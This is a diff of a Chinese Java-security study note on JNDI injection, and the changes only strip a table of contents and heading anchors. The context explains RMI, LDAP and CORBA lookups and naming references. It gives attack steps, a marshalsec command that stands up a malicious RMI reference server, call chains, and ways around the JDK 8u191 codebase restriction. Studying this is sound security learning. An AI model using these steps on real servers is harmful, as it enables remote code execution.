@@ -1,33 +1,8 @@
-<!-- vscode-markdown-toc -->
-* 1. [JNDI](#JNDI)
-	* 1.1. [简介](#)
-	* 1.2. [示例代码](#-1)
-* 2. [SPI](#SPI)
-	* 2.1. [RMI](#RMI)
-	* 2.2. [LDAP](#LDAP)
-	* 2.3. [CORBA](#CORBA)
-* 3. [动态协议转换](#-1)
-* 4. [命名引用](#-1)
-* 5. [漏洞利用](#-1)
-	* 5.1. [RMI](#RMI-1)
-		* 5.1.1. [示例代码](#-1)
-		* 5.1.2. [过程分析](#-1)
-		* 5.1.3. [调用链](#-1)
-	* 5.2. [LDAP](#LDAP-1)
-		* 5.2.1. [示例代码](#-1)
-		* 5.2.2. [过程分析](#-1)
-		* 5.2.3. [调用链](#-1)
-* 6. [绕过JDK 8u191+等高版本限制](#JDK8u191)
-* 7. [参考](#-1)
+# Java安全学习-JNDI注入
+作者: H3rmesk1t@D1no
 
-<!-- vscode-markdown-toc-config
-	numbering=true
-	autoSave=true
-	/vscode-markdown-toc-config -->
-<!-- /vscode-markdown-toc -->
-
-##  1. <a name='JNDI'></a>JNDI
-###  1.1. <a name=''></a>简介
+## JNDI
+### 简介
 `JNDI`(Java Naming Directory Interface)是`Java`提供的一个访问命令和目录服务的`API`, 命名服务将名称和对象联系起来, 使得可以从名称访问对象, [官方链接](https://docs.oracle.com/javase/tutorial/jndi/overview/index.html).
 
 ![JNDI](./images/1.gif)
@@ -47,7 +22,7 @@
 
 ![javax.naming](./images/1.png)
 
-###  1.2. <a name='-1'></a>示例代码
+### 示例代码
 这里通过实现一个简单的例子来更好的理解`JNDI`.
 
  - Demo.java
@@ -131,13 +106,13 @@ public class CallService {
 
 ![JNDI-Demo](./images/2.png)
 
-##  2. <a name='SPI'></a>SPI
+## SPI
 在`JDK`中内置了几个`Service Provider`, 分别是`RMI`、`LDAP`和`CORBA`. 但是这几个服务本身和`JNDI`没有直接的依赖, 而是通过`SPI`接口实现了联系.
 
-###  2.1. <a name='RMI'></a>RMI
+### RMI
 `RMI`(Remote Method Invocation), 即`Java`远程方法调用, 为应用提供了远程调用的接口, 一个简单的`RMI`主要由三部分组成, 分别是接口、服务端和客户端. 具体详见之间分析的[Java安全——RMI学习](https://github.com/H3rmesk1t/Learning_summary/blob/main/2022-1-19/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0-RMI%E5%AD%A6%E4%B9%A0.md).
 
-###  2.2. <a name='LDAP'></a>LDAP
+### LDAP
 `LDAP`(Lightweight Directory Access Protocol), 即轻量级目录访问协议. 它提供了一种查询、浏览、搜索和修改互联网目录数据的机制, 运行在`TCP/IP`协议栈上, 基于`C/S`架构.
 
 `Java`对象在`LDAP`目录中也有多种存储形式:
@@ -166,7 +141,7 @@ UID     userid
  - `DC`: `Domain Component`, 组成域名的部分, 比如域名`evilpan.com`的一条记录可以表示为`dc=evilpan,dc=com`, 从右至左逐级定义.
  - `DN`: `Distinguished Name`, 由一系列属性(从右至左)逐级定义的, 表示指定对象的唯一名称.
 
-###  2.3. <a name='CORBA'></a>CORBA
+### CORBA
 `CORBA`是一个由`Object Management Group`(OMG)定义的标准. 在分布式计算的概念中, `Object Request Broker`(ORB))表示用于分布式环境中远程调用的中间件. 其实就是早期的一个`RPC`标准, `ORB`在客户端负责接管调用并请求服务端, 在服务端负责接收请求并将结果返回. `CORBA`使用接口定义语言(IDL)去表述对象的对外接口, 编译生成的`stub code`支持`Ada`、`C/C++`、`Java`、`COBOL`等多种语言. 其调用架构如下图所示:
 
 ![CORBA](./images/3.png)
@@ -301,7 +276,7 @@ public class HelloClient
 }
 ```
 
-##  3. <a name='-1'></a>动态协议转换
+## 动态协议转换
 在上文的示例代码中都手动设置了对应服务的工厂以及对应服务的`PROVIDER_URL`, 其实在`JNDI`中是可以进行动态协议转换的, 示例代码如下:
 
  - Demo-1
@@ -342,7 +317,7 @@ context.lookup(name);
 |IIOP|iiopname://|com.sun.jndi.url.iiopname.iiopnameURLContext|
 |IIOP|corbaname://|com.sun.jndi.url.corbaname.corbanameURLContext|
 
-##  4. <a name='-1'></a>命名引用
+## 命名引用
 `JNDI`定义了命名引用(Naming References), 简称引用(References). 其大致过程就是通过绑定一个引用, 将对象存储到命名服务或目录服务中, 命名管理器(Naming Manager)可以将引用解析为关联的原始对象. 引用由`Reference`类来表示, 它由地址(RefAddress)的有序列表和所引用对象的信息组成. 而每个地址包含了如何构造对应的对象的信息, 包括引用对象的`Java`类名, 以及用于创建对象的`object factory`类的名称和位置. `Reference`可以使用工厂来构造对象, 当使用`lookup`查找对象时, `Reference`将使用提供的工厂类加载地址来加载工厂类, 工厂类将构造出需要的对象, 可以从远程加载地址来加载工厂类. 示例代码如下:
 
 ```java
@@ -371,8 +346,8 @@ ctx.bind("refObj", wrapper);
 
 ![JNDI限制](./images/7.jpeg)
 
-##  5. <a name='-1'></a>漏洞利用
-###  5.1. <a name='RMI-1'></a>RMI
+## 漏洞利用
+### RMI
 通过`RMI`进行`JNDI`注入的步骤大致为:
  - 攻击者构造恶意对象, 在其构造方法中加入恶意代码, 上传至服务器中等待远程加载.
  - 构造恶意 RMI 服务器, bind 一个 ReferenceWrapper 对象, ReferenceWrapper 对象是一个 Reference 对象的封装.
@@ -392,7 +367,7 @@ public Reference(String className, String factory, String factoryLocation) {
 }
 ```
 
-####  5.1.1. <a name='-1'></a>示例代码
+#### 示例代码
 
  - JNDIClient.java
 
@@ -490,7 +465,7 @@ public class evilObject {
 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:80/#testObject 7777
 ```
 
-####  5.1.2. <a name='-1'></a>过程分析
+#### 过程分析
 在`JNDIClient.java`文件中的`GenericURLContext#lookup`方法处下断点.
 
 ![JNDIClient-lookup](./images/9.png)
@@ -515,7 +490,7 @@ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer h
 
 ![效果图](./images/15.png)
 
-####  5.1.3. <a name='-1'></a>调用链
+#### 调用链
 
 ```java
 getObjectFactoryFromReference(Reference, String):163, NamingManager (javax.naming.spi), NamingManager.java
@@ -529,10 +504,10 @@ main(String[]):17, JNDIClient (jndi_test1), JNDIClient.java
 
 ![调用链](./images/16.png)
 
-###  5.2. <a name='LDAP-1'></a>LDAP
+### LDAP
 `LDAP`服务只是把协议名改成`ldap`即可, 分析过程和`RMI`类似.
 
-####  5.2.1. <a name='-1'></a>示例代码
+#### 示例代码
  - JNDIClient
 
 ```java
@@ -556,7 +531,7 @@ public class JNDIClient {
 
 ![JNDI-LDAP](./images/17.png)
 
-####  5.2.2. <a name='-1'></a>过程分析
+#### 过程分析
 这里利用`marshalsec`起一个`LDAP`服务, 同样将断点下在`lookup`处. 之前的步骤和`RMI`一样, 这里直接分析后面不同的地方.
 
 跟进`GenericURLContext#lookup`方法, 进一步调用`PartialCompositeContext#lookup`方法, 在`for`循环的条件中先调用`ComponentContext#p_lookup`方法.
@@ -575,7 +550,7 @@ public class JNDIClient {
 
 ![DirectoryManager#getObjectInstance](./images/21.png)
 
-####  5.2.3. <a name='-1'></a>调用链
+#### 调用链
 
 ```java
 getObjectFactoryFromReference(Reference, String):142, NamingManager (javax.naming.spi), NamingManager.java
@@ -591,7 +566,7 @@ main(String[]):14, JNDIClient (jndi_test1), JNDIClient.java
 
 ![LDAP调用链](./images/22.png)
 
-##  6. <a name='JDK8u191'></a>绕过JDK 8u191+等高版本限制
+## 绕过JDK 8u191+等高版本限制
 自[jdk8u191-b02](http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/rev/2db6890a9567#l1.33)版本后, 新添加了`com.sun.jndi.ldap.object.trustURLCodebase`默认为`false`的限制, 在`decodeObject`方法处新增了一个读`trustURLCodebase`的判断, 而这个值默认是为`false`的, 因此无法通过`RMI`、`LDAP`加载远程的`Reference`工厂类.
 
 ![trustURLCodebase](./images/23.png)
@@ -602,7 +577,7 @@ main(String[]):14, JNDIClient (jndi_test1), JNDIClient.java
 
 这两种方式都依赖受害者本地`CLASSPATH`中环境, 需要利用受害者本地的`Gadget`进行攻击.
 
-##  7. <a name='-1'></a>参考
+## 参考
  - [JAVA JNDI注入知识详解](https://www.anquanke.com/post/id/205447)
  - [JNDI 注入漏洞的前世今生](https://evilpan.com/2021/12/13/jndi-injection/)
  - [Lesson: Overview of JNDI](https://docs.oracle.com/javase/tutorial/jndi/overview/index.html)
